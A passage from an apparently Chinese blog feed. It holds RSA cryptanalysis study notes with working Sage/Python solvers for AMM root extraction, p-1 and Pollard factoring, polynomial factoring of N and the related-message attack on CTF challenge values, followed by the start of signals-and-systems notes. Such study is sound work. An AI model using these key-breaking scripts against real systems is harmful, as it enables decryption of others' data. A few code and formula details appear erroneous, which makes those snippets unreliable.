daemon=<span class="literal">True</span>)</span><br><span class="line">    thi.start()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+] Thread %d starting...&#x27;</span> % (i+<span class="number">1</span>))</span><br><span class="line">thi = threading.Thread(target=CRT_threading, args=(mps, mqs[i*(<span class="built_in">len</span>(mqs) // thread_number):], p, q), daemon=<span class="literal">True</span>)</span><br><span class="line">thi.start()</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> flag:</span><br><span class="line">    ...</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="amm">AMM</h3>
<p>在 Sagemath 中，构造多项式求根或者使用 <code>nth_root</code> 的
<code>Johnston</code> 算法（<code>Johnston</code>
算法在针对小指数和不满足 <span class="math inline">\(e||p-1\)</span>
的时候效率较高）对较大指数效率都较为低下，这个时候需要使用
<code>Adleman-Manders-Miller rth Root Extraction Method</code>
算法，简称 <code>AMM</code> 算法快速求有限域下的根。</p>
<p><code>AMM</code>
算法是目前在大指数下求高次根效率也较高的算法，但求高次根时需要满足条件
<span class="math inline">\(e||(p-1)\)</span>，其中 <span class="math inline">\(F_p\)</span> 为有限域。</p>
<blockquote>
<p>目前 Sagemath 的更新进度似乎打算在 Sagemath9.8 加入
<code>nth_root</code> 函数对 <code>AMM</code> 算法的支持。</p>
</blockquote>
<p>Sagemath 代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">AMM</span>(<span class="params">delta: <span class="built_in">int</span>, r: <span class="built_in">int</span>, q: <span class="built_in">int</span>, <span class="built_in">all</span>:<span class="built_in">bool</span> = <span class="literal">False</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    使用AMM算法进行有限域开根，即求delta^(1/r)%q下的解</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    `Parameter`:</span></span><br><span class="line"><span class="string">        delta - 底数</span></span><br><span class="line"><span class="string">        r - 根指数</span></span><br><span class="line"><span class="string">        q - 模数</span></span><br><span class="line"><span class="string">        all - 是否返回所有解</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    `Return`:</span></span><br><span class="line"><span class="string">        delta^(1/r)%q下的一个根</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (q - <span class="number">1</span>) % r != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">raise</span> <span class="string">&quot;使用AMM算法需要满足e||(p-1)&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># step 1</span></span><br><span class="line">    Fq = GF(q)</span><br><span class="line">    delta = Fq(delta)</span><br><span class="line">    rho = Fq.random_element()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># step 2</span></span><br><span class="line">    <span class="keyword">while</span> rho ** ((q - <span class="number">1</span>) // r) == <span class="number">1</span>:</span><br><span class="line">        rho = Fq.random_element()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># step 3</span></span><br><span class="line">    <span class="comment"># step 3.1</span></span><br><span class="line">    t = <span class="number">0</span></span><br><span class="line">    s = q - <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> s % r == <span class="number">0</span>:</span><br><span class="line">        t += <span class="number">1</span></span><br><span class="line">        s //= r</span><br><span class="line">    <span class="comment"># step 3.2</span></span><br><span class="line">    k = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> (k * s + <span class="number">1</span>) % r != <span class="number">0</span>:</span><br><span class="line">        k += <span class="number">1</span></span><br><span class="line">    alpha = (k * s + <span class="number">1</span>) // r</span><br><span class="line">    <span class="comment"># step 3.3</span></span><br><span class="line">    a = rho ** (r ** t - <span class="number">1</span> * s)</span><br><span class="line">    b = delta ** (r * alpha - <span class="number">1</span>)</span><br><span class="line">    c = rho ** s</span><br><span class="line">    h = <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># step 4</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, t):</span><br><span class="line">        d = b ** <span class="built_in">pow</span>(r, t - <span class="number">1</span> - i, q - <span class="number">1</span>)</span><br><span class="line">        j = <span class="number">0</span> <span class="keyword">if</span> d == <span class="number">1</span> <span class="keyword">else</span> -d.log(a)</span><br><span class="line">        b *= (c ** r) ** j</span><br><span class="line">        h *= c ** j</span><br><span class="line">        c **= r</span><br><span class="line"></span><br><span class="line">    <span class="comment"># step 5</span></span><br><span class="line">    root = <span class="built_in">int</span>(delta ** alpha * h)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">all</span>:</span><br><span class="line">        <span class="keyword">return</span> root</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># if all is True, generate all roots to return</span></span><br><span class="line">    <span class="comment"># 2 ^ (q - 1) == 1 (mod q) because of Fermat&#x27;s little theorem</span></span><br><span class="line">    g = <span class="built_in">pow</span>(<span class="number">2</span>, (q - <span class="number">1</span>) // r, q)</span><br><span class="line">    <span class="comment"># find all primitive i-th roots of 1</span></span><br><span class="line">    ith_roots = [<span class="built_in">pow</span>(g, i, q) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(r)]</span><br><span class="line">    <span class="keyword">return</span> [<span class="built_in">int</span>(root * ith_root % q) <span class="keyword">for</span> ith_root <span class="keyword">in</span> ith_roots]</span><br></pre></td></tr></table></figure>
<h2 id="p-1-光滑数分解"><span class="math inline">\(p-1\)</span>
光滑数分解</h2>
<h3 id="特征-11">特征</h3>
<p><span class="math inline">\(p-1\)</span> 为光滑数。</p>
<h3 id="原理-13">原理</h3>
<p>已知 <span class="math inline">\(p-1\)</span> 为若干个
<code>primes</code> 元素相乘得到的平滑数，其中 <code>primes</code>
为一组已知素数，不妨取 <span class="math display">\[
P=\prod{primes}
\]</span> 那么原素数 <span class="math inline">\(p\)</span> 可以表示为
<span class="math display">\[
p-1=kP
\]</span> 其中 <span class="math inline">\(k\)</span> 为 <span class="math inline">\(primes\)</span> 任意元素的乘积。</p>
<p>费马小定理有，若 <span class="math inline">\(p\)</span>
为一个素数，则对于任意非 <span class="math inline">\(p\)</span> 整数
<span class="math inline">\(a\)</span> 有 <span class="math inline">\(a^{p-1}\equiv1\pmod{p}\)</span> 。</p>
<p>那么取任意的 <span class="math inline">\(a\)</span> ，有 <span class="math display">\[
a^{kP}=1\pmod{p}
\]</span> 即有 <span class="math display">\[
a^P=1\pmod{p}=1+tp,t\in\Z
\]</span> 记 <span class="math inline">\(N=pq\)</span>，那么 <span class="math display">\[
\gcd{(a^P-1,N)}=p
\]</span> 我们便分解了 <span class="math inline">\(N\)</span>。</p>
<p>需要注意的是，实际计算中 <span class="math inline">\(a^P\)</span>
不好计算，一般计算 <span class="math inline">\(a^P-1\pmod
N\)</span>，可以证明与 <span class="math inline">\(1\pmod{p}\)</span>
同余。</p>
<h3 id="实例-2">实例</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> choice</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> isPrime, sieve_base <span class="keyword">as</span> primes</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getPrime</span>(<span class="params">bits</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        n = <span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> n.bit_length() &lt; bits:</span><br><span class="line">            n *= choice(primes)</span><br><span class="line">        <span class="keyword">if</span> isPrime(n + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">return</span> n + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">m = <span class="built_in">int</span>.from_bytes(flag.encode(), <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">p, q = [getPrime(<span class="number">2048</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)]</span><br><span class="line">n = p * q</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># n = 32849718197337581823002243717057659218502519004386996660885100592872201948834155543125924395614928962750579667346279456710633774501407292473006312537723894221717638059058796679686953564471994009285384798450493756900459225040360430847240975678450171551048783818642467506711424027848778367427338647282428667393241157151675410661015044633282064056800913282016363415202171926089293431012379261585078566301060173689328363696699811123592090204578098276704877408688525618732848817623879899628629300385790344366046641825507767709276622692835393219811283244303899850483748651722336996164724553364097066493953127153066970594638491950199605713033004684970381605908909693802373826516622872100822213645899846325022476318425889580091613323747640467299866189070780620292627043349618839126919699862580579994887507733838561768581933029077488033326056066378869170169389819542928899483936705521710423905128732013121538495096959944889076705471928490092476616709838980562233255542325528398956185421193665359897664110835645928646616337700617883946369110702443135980068553511927115723157704586595844927607636003501038871748639417378062348085980873502535098755568810971926925447913858894180171498580131088992227637341857123607600275137768132347158657063692388249513</span></span><br><span class="line"><span class="comment"># c = 26308018356739853895382240109968894175166731283702927002165268998773708335216338997058314157717147131083296551313334042509806229853341488461087009955203854253313827608275460592785607739091992591431080342664081962030557042784864074533380701014585315663218783130162376176094773010478159362434331787279303302718098735574605469803801873109982473258207444342330633191849040553550708886593340770753064322410889048135425025715982196600650740987076486540674090923181664281515197679745907830107684777248532278645343716263686014941081417914622724906314960249945105011301731247324601620886782967217339340393853616450077105125391982689986178342417223392217085276465471102737594719932347242482670320801063191869471318313514407997326350065187904154229557706351355052446027159972546737213451422978211055778164578782156428466626894026103053360431281644645515155471301826844754338802352846095293421718249819728205538534652212984831283642472071669494851823123552827380737798609829706225744376667082534026874483482483127491533474306552210039386256062116345785870668331513725792053302188276682550672663353937781055621860101624242216671635824311412793495965628876036344731733142759495348248970313655381407241457118743532311394697763283681852908564387282605279108</span></span><br></pre></td></tr></table></figure>
<h3 id="代码-2">代码</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="number">32849718197337581823002243717057659218502519004386996660885100592872201948834155543125924395614928962750579667346279456710633774501407292473006312537723894221717638059058796679686953564471994009285384798450493756900459225040360430847240975678450171551048783818642467506711424027848778367427338647282428667393241157151675410661015044633282064056800913282016363415202171926089293431012379261585078566301060173689328363696699811123592090204578098276704877408688525618732848817623879899628629300385790344366046641825507767709276622692835393219811283244303899850483748651722336996164724553364097066493953127153066970594638491950199605713033004684970381605908909693802373826516622872100822213645899846325022476318425889580091613323747640467299866189070780620292627043349618839126919699862580579994887507733838561768581933029077488033326056066378869170169389819542928899483936705521710423905128732013121538495096959944889076705471928490092476616709838980562233255542325528398956185421193665359897664110835645928646616337700617883946369110702443135980068553511927115723157704586595844927607636003501038871748639417378062348085980873502535098755568810971926925447913858894180171498580131088992227637341857123607600275137768132347158657063692388249513</span></span><br><span class="line">c = <span class="number">26308018356739853895382240109968894175166731283702927002165268998773708335216338997058314157717147131083296551313334042509806229853341488461087009955203854253313827608275460592785607739091992591431080342664081962030557042784864074533380701014585315663218783130162376176094773010478159362434331787279303302718098735574605469803801873109982473258207444342330633191849040553550708886593340770753064322410889048135425025715982196600650740987076486540674090923181664281515197679745907830107684777248532278645343716263686014941081417914622724906314960249945105011301731247324601620886782967217339340393853616450077105125391982689986178342417223392217085276465471102737594719932347242482670320801063191869471318313514407997326350065187904154229557706351355052446027159972546737213451422978211055778164578782156428466626894026103053360431281644645515155471301826844754338802352846095293421718249819728205538534652212984831283642472071669494851823123552827380737798609829706225744376667082534026874483482483127491533474306552210039386256062116345785870668331513725792053302188276682550672663353937781055621860101624242216671635824311412793495965628876036344731733142759495348248970313655381407241457118743532311394697763283681852908564387282605279108</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">P = prod(primes)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里的3是任取的</span></span><br><span class="line">pp = <span class="built_in">pow</span>(<span class="number">3</span>, P, n) - <span class="number">1</span></span><br><span class="line">p = gcd(pp, n)</span><br><span class="line">q = n // <span class="built_in">int</span>(p)</span><br><span class="line"><span class="keyword">assert</span> p * q == n</span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = inverse_mod(e, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br></pre></td></tr></table></figure>
<h3 id="pollard-p-1-method">Pollard p-1 method</h3>
<h4 id="原理-14">原理</h4>
<p>对于 <span class="math inline">\(p-1\)</span>
为光滑数，更有效且通用的方法是使用 <code>Pollard p-1 method</code>
算法。</p>
<p>根据以上的原理证明，Pollard 发现当 <code>primes</code>
恰好为许多小素数的时候，那么 <span class="math inline">\(p-1\)</span>
也整除 <span class="math inline">\(n!\)</span>，其中 <span class="math inline">\(n\)</span> 为不太大的一个整数。</p>
<p>故当我们未知 <span class="math inline">\(primes\)</span>
时，可以简单爆破 <span class="math inline">\(n\)</span> 求解 <span class="math display">\[
g=\gcd(a^{n!}-1,N)
\]</span> 当 <span class="math inline">\(g=1\)</span>
时，需要接着求下一个 <span class="math inline">\(n\)</span> 的值；</p>
<p>当 <span class="math inline">\(g=N\)</span> 时，需要修改 <span class="math inline">\(a\)</span> 的值（实际中一般从 2 开始）；</p>
<p>当 <span class="math inline">\(1&lt;g&lt;N\)</span> 时，那么 <span class="math inline">\(g\)</span> 就是 <span class="math inline">\(N\)</span> 的一个因子。</p>
<p>同理我们实际上会直接求 <span class="math inline">\(a^{n!}-1\pmod{N}\)</span> 而非 <span class="math inline">\(a^{n!}-1\)</span>。</p>
<h4 id="代码-3">代码</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line">N = <span class="number">32849718197337581823002243717057659218502519004386996660885100592872201948834155543125924395614928962750579667346279456710633774501407292473006312537723894221717638059058796679686953564471994009285384798450493756900459225040360430847240975678450171551048783818642467506711424027848778367427338647282428667393241157151675410661015044633282064056800913282016363415202171926089293431012379261585078566301060173689328363696699811123592090204578098276704877408688525618732848817623879899628629300385790344366046641825507767709276622692835393219811283244303899850483748651722336996164724553364097066493953127153066970594638491950199605713033004684970381605908909693802373826516622872100822213645899846325022476318425889580091613323747640467299866189070780620292627043349618839126919699862580579994887507733838561768581933029077488033326056066378869170169389819542928899483936705521710423905128732013121538495096959944889076705471928490092476616709838980562233255542325528398956185421193665359897664110835645928646616337700617883946369110702443135980068553511927115723157704586595844927607636003501038871748639417378062348085980873502535098755568810971926925447913858894180171498580131088992227637341857123607600275137768132347158657063692388249513</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">PollardMethod</span>(<span class="params">N: <span class="built_in">int</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Pollard p-1 method</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    `Parameters`:</span></span><br><span class="line"><span class="string">        N - 要分解的大素数</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    `Returns`:</span></span><br><span class="line"><span class="string">        N的一个因子</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    a = <span class="number">2</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> itertools.count(<span class="number">2</span>):</span><br><span class="line">        a = <span class="built_in">pow</span>(a, n, N)</span><br><span class="line">        g = gcd(a - <span class="number">1</span>, N)</span><br><span class="line">        <span class="keyword">if</span> g == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">elif</span> g == N:</span><br><span class="line">            a += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> g</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(PollardMethod(N))</span><br></pre></td></tr></table></figure>
<blockquote>
<p>需要注意的是，个人使用 Python 没办法跑出结果，得用 Sagemath。</p>
</blockquote>
<p>可以借助 Python 模块 <code>primefac</code> 进行分解：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -m primefac -vs -m=p-1 32849718197337581823002243717057659218502519004386996660885100592872201948834155543125924395614928962750579667346279456710633774501407292473006312537723894221717638059058796679686953564471994009285384798450493756900459225040360430847240975678450171551048783818642467506711424027848778367427338647282428667393241157151675410661015044633282064056800913282016363415202171926089293431012379261585078566301060173689328363696699811123592090204578098276704877408688525618732848817623879899628629300385790344366046641825507767709276622692835393219811283244303899850483748651722336996164724553364097066493953127153066970594638491950199605713033004684970381605908909693802373826516622872100822213645899846325022476318425889580091613323747640467299866189070780620292627043349618839126919699862580579994887507733838561768581933029077488033326056066378869170169389819542928899483936705521710423905128732013121538495096959944889076705471928490092476616709838980562233255542325528398956185421193665359897664110835645928646616337700617883946369110702443135980068553511927115723157704586595844927607636003501038871748639417378062348085980873502535098755568810971926925447913858894180171498580131088992227637341857123607600275137768132347158657063692388249513</span><br></pre></td></tr></table></figure>
<h2 id="n-多项式分解"><span class="math inline">\(N\)</span>
多项式分解</h2>
<h3 id="原理-15">原理</h3>
<p>首先我们知道多项式分解的复杂度在于其项数的多少和系数的大小，同时任意一个数我们可以使用多项式来表达，比如说数字
1234567890 可以表达为： <span class="math display">\[
P_{10}(x)=x^{9} + 2x^{8} + 3x^{7} + 4x^{6} + 5x^{5} + 6x^{4} + 7x^{3} +
8x^{2} + 9x\\
P(10)=1234567890
\]</span> 或者是 <span class="math display">\[
P_{5}(x)=x^{13} + x^{10} + 2x^{9} + 2x^{7} + 2x^{6} + x^{5} + 3x^{4} +
3x^{3} + 3x\\
P(5)=1234567890
\]</span> 甚至是 <span class="math display">\[
P_{1000}=x^{3} + 234x^{2} + 567x + 890\\
P(1000)=1234567890
\]</span> 可以发现，在不同的进制下，多项式的复杂度会发生改变。</p>
<p>于是乎有可能出现在十进制下多项式复杂，分解时间复杂度高，但其他进制下多项式简单，分解时间复杂度低。</p>
<h3 id="实例-3">实例</h3>
<p>分解因数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">N = <span class="number">264048827496427248021277383801027180195275776366915828865010362454006394906519399441496561006668252031429735502465174250525698696973129422193405161920872162928097673289330345041221985548078586423910246601720647996170161319016119241836415788315729493164331517547663558380515400720081995290120793014108439083514403659082115510258023834737471488528527557960636984676435543300074504679264476413252780514962473070445293528877641502742438571110744667739728450283295649865745629276142949963507003094791773183928894536793857609738113546410753895719242547720815692998871947957214118354127328586542848234994500987288641595105</span></span><br></pre></td></tr></table></figure>
<p>代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">N = <span class="number">264048827496427248021277383801027180195275776366915828865010362454006394906519399441496561006668252031429735502465174250525698696973129422193405161920872162928097673289330345041221985548078586423910246601720647996170161319016119241836415788315729493164331517547663558380515400720081995290120793014108439083514403659082115510258023834737471488528527557960636984676435543300074504679264476413252780514962473070445293528877641502742438571110744667739728450283295649865745629276142949963507003094791773183928894536793857609738113546410753895719242547720815692998871947957214118354127328586542848234994500987288641595105</span></span><br><span class="line">base = <span class="number">11</span></span><br><span class="line"></span><br><span class="line">P.&lt;x&gt; = ZZ[]</span><br><span class="line">f = P(N.digits(base))</span><br><span class="line"><span class="comment"># (x^295 + 2*x^249 + x^196 + 1) * (x^295 + 2*x^281 + 2*x^192 + x^100 + 2*x^37 + 1)</span></span><br><span class="line">F_factor = factor(f)</span><br><span class="line">factors = []</span><br><span class="line"><span class="keyword">for</span> fac <span class="keyword">in</span> F_factor:</span><br><span class="line">    factors.append(fac[<span class="number">0</span>](base))</span><br><span class="line"><span class="built_in">print</span>(factors)</span><br></pre></td></tr></table></figure>
<h2 id="多项式关联攻击">多项式关联攻击</h2>
<h3 id="原理-16">原理</h3>
<p>如果存在线性相关的明文 <span class="math inline">\(m_1,m_2\)</span>，即存在多项式函数 <span class="math inline">\(f(x)\)</span> 满足 <span class="math display">\[
m_2=f(m_1)
\]</span></p>
<blockquote>
<p>例如一个最简单的多项式函数是 <span class="math inline">\(f(x)=ax+b\)</span>。</p>
</blockquote>
<p>如果说存在一个多项式函数 <span class="math display">\[
g(x)=a_lx^l+a_{l-1}x^{l-1}+\cdots+a_1x+a_0
\]</span> 使得明文满足 <span class="math display">\[
c_1=g(m_1),c_2=g(m_2)
\]</span></p>
<blockquote>
<p>例如一个最常见的多项式函数 <span class="math inline">\(c=g(m)=m^e\pmod{N}\)</span>。</p>
</blockquote>
<p>那么必然有 <span class="math display">\[
G(x)=\gcd(g(m_1)-c_1,g(m_2)-c_2)
\]</span> 满足 <span class="math display">\[
m_1=-G(0)
\]</span> 在模 <span class="math inline">\(N\)</span> 下也满足。</p>
<p>故在 RSA 中同样可以构建两式破解明文。</p>
<h3 id="代码-4">代码</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">RelatedMessageAttack</span>(<span class="params">g1, g2, c1, c2, N</span>):</span><br><span class="line">    P.&lt;x&gt; = Zmod(N)[]</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">gcd</span>(<span class="params">g1, g2</span>):</span><br><span class="line">        <span class="built_in">print</span>(g1)</span><br><span class="line">        <span class="built_in">print</span>(g2)</span><br><span class="line">        <span class="keyword">while</span> g2:</span><br><span class="line">            g1, g2 = g2, g1 % g2</span><br><span class="line">        <span class="keyword">return</span> g1.monic()</span><br><span class="line">    G = gcd(g1(x) - c1, g2(x) - c2)</span><br><span class="line">    m1 = -G(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> m1</span><br><span class="line"></span><br><span class="line">N = <span class="number">8963244108103857378610478915798540027754205184635651624801332901515870452435977078824267979279218575027152343028911705254378598817260939339516835322386427</span></span><br><span class="line">a = <span class="number">259416965926853287275013962386631097709</span></span><br><span class="line">magic = <span class="number">103935716419468143616714177161525414254</span></span><br><span class="line">P.&lt;x&gt; = Zmod(N)[]</span><br><span class="line">x0 = x ^ e</span><br><span class="line">x1 = (x + magic) ^ e</span><br><span class="line"><span class="comment"># 这里可以知道 g(x0), g(x1) 同样是多项式函数</span></span><br><span class="line">y0 = <span class="number">1896722249337161391193797083807118705857637064141055866260977430130447249097804719101078827699386498665026965515554644281163046869672493999194358926022865</span></span><br><span class="line">y1 = <span class="number">4074555112002157403114317690671003025383051142150876016519408756236925988856478235258960189636836867363451314784889114354880607055705753428890566240606935</span></span><br><span class="line">g = <span class="keyword">lambda</span> x: x ** <span class="number">3</span> + a * x + b</span><br><span class="line">RelatedMessageAttack(g(x0), g(x1), y0 ** <span class="number">2</span>, y1 ** <span class="number">2</span>, N)</span><br></pre></td></tr></table></figure>
<h2 id="已知-poplus-q">已知 <span class="math inline">\(p\oplus
q\)</span></h2>
<h3 id="原理-17">原理</h3>
<p>已知 <span class="math inline">\(x=p\oplus q\)</span>
的结果，就相当于一个 GF(2) 下的多项式的加法结果已知，同时又因为 <span class="math inline">\(n=pq\)</span>，故其多项式的乘法结果也已知，此时我们仅需简单爆破系数或直接构造矩阵求解即可。</p>
<p>参考代码：<a href="https://github.com/sliedes/xor_factor">https://github.com/sliedes/xor_factor</a></p>
]]></content>
      <tags>
        <tag>note</tag>
        <tag>crypto</tag>
        <tag>rsa</tag>
      </tags>
  </entry>
  <entry>
    <title>信号与系统笔记</title>
    <url>//signal-and-system-note2.html</url>
    <content><![CDATA[<h1 id="信号与系统">信号与系统</h1>
<h2 id="系统的时域分析">系统的时域分析</h2>
<h3 id="经典法">经典法</h3>
<p>一个定常系统（线性系统）对应的数学模型是一个<strong>线性常系数常微分方程</strong>。</p>
<p>设系统的激励信号为 <span class="math inline">\(e(t)\)</span>，响应为
<span class="math inline">\(r(t)\)</span>，则它的数学模型可表示为 <span class="math display">\[
\newcommand{\diff}{\mathrm{d}}
C_0\frac{\diff^n}{\diff{t^n}}r(t)+C_1\frac{\diff^{n-1}}{\diff{t^{n-1}}}r(t)+\cdots+C_{n-1}\frac{\diff}{\diff{t}}r(t)+C_nr(t)\\
=E_0\frac{\diff^m}{\diff{t^m}}e(t)+E_1\frac{\diff^{m-1}}{\diff{t^{m-1}}}e(t)+\cdots+E_{m-1}\frac{\diff}{\diff{t}}e(t)+E_me(t)
\]</span>
在经典法中，一个微分方程的解由两部分组成：齐次解和非齐次解。</p>
<h4 id="齐次解-r_ht">齐次解 <span class="math inline">\(r_h(t)\)</span></h4>
<p>求解齐次解 <span class="math inline">\(r_h(t)\)</span> 即求解方程</p>
<blockquote>
<p>Homogeneous equation 是齐次方程的英文。</p>
</blockquote>
<p><span class="math display">\[
C_0\frac{\diff^n}{\diff{t^n}}r(t)+C_1\frac{\diff^{n-1}}{\diff{t^{n-1}}}r(t)+\cdots+C_{n-1}\frac{\diff}{\diff{t}}r(t)+C_nr(t)=0
\]</span></p>
<p>用算子符号将方程中的 <span class="math inline">\(\frac{\diff}{\diff{t}}\)</span> 简记为 <span class="math inline">\(p\)</span>，则方程化为 <span class="math display">\[
C_0p^nr(t)+C_1p^{n-1}r(t)+\cdots+C_{n-1}pr(t)+C_nr(t)=0
\]</span> 提取出特征有 <span class="math display">\[
C_0p^n+C_1p^{n-1}+\cdots+C_{n-1}p+C_n=0
\]</span>
该方程称为<strong>特征根方程</strong>，该方程的解称为<strong>特征根</strong>。</p>
<p>记特征根为 <span class="math inline">\(\lambda_k\)</span>，则齐次微分方程的通解为 <span class="math display">\[
r(t)=Ae^{\lambda_kt}
\]</span></p>
<blockquote>
<p><span class="math inline">\(e^{\lambda_k t}\)</span> 又称为模态。</p>
</blockquote>
<p>（1）若特征根各不相同（无重根），那么解出的齐次解为 <span class="math display">\[
\begin{align}
r_h(t)&amp;=A_1e^{\lambda_1 t}+A_2e^{\lambda_2 t}+\cdots+A_ne^{\lambda_n
t}\\
&amp;=\sum^n_{i=1}A_ie^{\lambda_i t}
\end{align}
\]</span> （2）若有重根，例如 <span class="math inline">\(\lambda_1\)</span> 是特征根方程的 <span class="math inline">\(k\)</span>
阶重根，那么重根部分会使得齐次解的一部分替换为 <span class="math display">\[
(\sum^k_{i=1}A_it^{k-i})e^{\lambda_1 t}
\]</span> <span class="math inline">\(k\)</span>
阶重根指这个特征根有几个相同的根。</p>
<p>例如，求如下微分方程的齐次解 <span class="math display">\[
\frac{\diff^3}{\diff{t^3}}r(t)+7\frac{\diff^2}{\diff{t^2}}r(t)+16\frac{\diff}{\diff{t}}r(t)+12r(t)=e(t)
\]</span> 特征方程为 <span class="math display">\[
p^3+7p^2+16p+12=0
\]</span> 化简得到 <span class="math display">\[
(p+2)^2(p+3)=0
\]</span> 求解得到 <span class="math display">\[
\lambda_1=\lambda_2=-2,\lambda_3=-3
\]</span> 知 <span class="math inline">\(-2\)</span> 为二阶重根。</p>
<p>故齐次解为 <span class="math display">\[
r_h(t)=(A_1t+A_2)e^{-2t}+A_3e^{-3}t
\]</span></p>
<h4 id="特解-r_pt">特解 <span class="math inline">\(r_p(t)\)</span></h4>
<p>微分方程的特解 <span class="math inline">\(r_p(t)\)</span>
与激励函数的形式有关系。</p>
<figure>
<img src="/signal-and-system-note2/典型激励函数相应特解.jpg" alt="典型激励函数相应特解">
<figcaption aria-hidden="true">典型激励函数相应特解</figcaption>
</figure>
<p>例如，求如下微分方程的特解 <span class="math display">\[
\frac{\diff^2}{\diff{t^2}}r(t)+2\frac{\diff}{\diff{t}}r(t)+3r(t)=\frac{\diff}{\diff{t}}e(t)+e(t)
\]</span> 其中 <span class="math inline">\(e(t)=t^2\)</span>。</p>
<p>代入得到激励为 <span class="math display">\[
t^2+2t
\]</span> 选取特解函数式 <span class="math display">\[
r_p(t)=B_1t^2+B_2t+B_3
\]</span> 代入可解 <span class="math display">\[
r_p(t)=\frac{1}{3}t^2+\frac{2}{9}t-\frac{10}{27}
\]</span></p>
<blockquote>
<p>注意齐次解是通解，没有初始条件无法求得系数的值，仅仅与系统本身的性质有关；但特解与外部输入有关。</p>
</blockquote>
<h4 id="初始条件求待定系数">初始条件求待定系数</h4>
<p>在系统中，激励一般在 <span class="math inline">\(t=0\)</span>
时刻加入，故当 <span class="math inline">\(t=0\)</span>
的一组条件就是初始条件，代入可得 <span class="math display">\[
\left\{\begin{array}{l}
r(0)=A_{1}+A_{2}+\cdots+A_{n}+r_{\mathrm{p}}(0) \\
\frac{\mathrm{d}}{\mathrm{d} t} r(0)=A_{1} \alpha_{1}+A_{2}
\alpha_{2}+\cdots+A_{n} \alpha_{n}+\frac{\mathrm{d}}{\mathrm{d} t}
r_{\mathrm{p}}(0) \\
\quad \vdots \\
\frac{\mathrm{d}^{n-1}}{\mathrm{~d} t^{n-1}} r(0)=A_{1}
\alpha_{1}^{n-1}+A_{2}
\alpha_{2}^{n-1}+\cdots+A_{n}+\frac{\mathrm{d}^{n-1}}{\mathrm{~d}
t^{n-1}} r_{\mathrm{p}}(0)
\end{array}\right.
\]</span></p>
<h3 id="起始点的跳变">起始点的跳变</h3>
<p>由于激励信号的作用，响应 <span class="math inline">\(r(t)\)</span>
可能会发生跳变（如电感电流和电容电压），为区分跳变前后的状态，我们定义：</p>
<ul>
<li><span class="math inline">\(0_-\)</span>
表示为激励<strong>接入之前</strong>的是瞬时；</li>
<li><span class="math inline">\(0_+\)</span>
表示为激励<strong>接入之后</strong>的是瞬时；</li>
</ul>
<p>同时代入后的两组状态：</p>
<ul>
<li><span class="math inline">\(r^{(k)}(0_-)\)</span>
称作<strong>起始状态</strong>（<span class="math inline">\(0_-\)</span>
状态）；</li>
<li><span class="math inline">\(r^{(k)}(0_+)\)</span>
